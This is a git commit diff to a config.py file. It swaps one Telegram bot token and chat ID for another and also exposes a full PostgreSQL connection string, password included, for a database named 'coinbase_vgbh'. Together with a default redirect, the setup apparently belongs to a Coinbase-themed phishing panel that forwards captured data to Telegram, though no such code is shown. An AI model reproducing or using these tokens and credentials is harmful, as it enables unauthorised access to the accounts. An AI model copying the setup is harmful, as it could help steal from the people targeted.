aa0c4854b077b14d9374d679f6d1156c233e7cda
ReddyAnna1 <bitlyvsha@gmail.com>
2025-08-25 22:48:45 +0300

    Update config.py

--- config.py
+++ config.py
@@ -5,8 +5,8 @@ load_dotenv()
 
 class Config:
     SECRET_KEY = 'dev-key-change-in-production'
-    TELEGRAM_BOT_TOKEN = '7502498778:AAFasWE3M0no2YVgfYPngtnolQKlIZ0rf44'
-    TELEGRAM_CHAT_ID = '6604253131'
+    TELEGRAM_BOT_TOKEN = '8010926424:AAFlcdE_J0BJjB8j86sCHajbjeKriWgoGUM'
+    TELEGRAM_CHAT_ID = '7217555825'
     DEFAULT_REDIRECT = 'https://www.google.com'
     
     SQLALCHEMY_DATABASE_URI = 'postgresql://coinbase_vgbh_user:iVgMyd09I85kSpX3TwZi7jVKaK8PNQ27@dpg-d2mb3u24d50c73alq450-a.oregon-postgres.render.com/coinbase_vgbh'
